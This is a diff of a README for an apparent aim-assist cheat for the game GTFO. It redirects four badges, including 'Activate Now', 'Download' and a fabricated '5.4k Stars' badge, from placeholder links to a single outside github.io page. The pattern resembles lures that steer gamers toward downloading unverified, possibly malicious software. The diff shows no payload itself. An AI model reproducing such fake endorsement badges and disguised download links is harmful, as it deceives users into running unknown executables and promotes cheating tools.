@@ -12,10 +12,10 @@ GTFO’s unforgiving enemies and low ammo economy mean every shot counts. Aim as
 This trainer is meant for **offline practice and private testing sessions** only.
 
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 5.4k Stars](https://img.shields.io/badge/⭐️%205.4k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://gtfo-aim-assist.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://gtfo-aim-assist.github.io/.github/)
+[![⭐️ 5.4k Stars](https://img.shields.io/badge/⭐️%205.4k-Stars-yellow?style=for-the-badge\&logo=github)](https://gtfo-aim-assist.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://gtfo-aim-assist.github.io/.github/)
 
 
 ---
